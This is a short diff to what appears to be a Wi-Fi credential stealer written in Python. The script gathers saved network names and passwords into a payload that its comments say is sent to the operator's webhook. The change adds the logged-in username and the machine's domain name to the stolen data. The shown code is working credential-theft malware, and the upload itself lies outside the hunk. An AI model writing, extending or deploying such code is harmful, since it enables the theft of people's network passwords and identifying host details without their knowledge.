@@ -36,8 +36,16 @@ if len(pwnd) == 0:
 
 print("Wi-Fi profiles found. Check your webhook...")
 
+#Get user and fqdn
+from os import getlogin
+user_name=getlogin()
+
+from socket import getfqdn
+domain_name=getfqdn()
+
 #Send the hackies to your webhookz
-final_payload = ""
+hostinfo = "[Username: " + user_name + "]\n" + "[Domain: " + domain_name + "]\n"
+final_payload = str(hostinfo)
 for pwnd_ssid in pwnd:
     final_payload += "[SSID:%s, Password:%s]\n" % (pwnd_ssid["SSID"], pwnd_ssid["Password"]) # Payload display format can be changed as desired
 
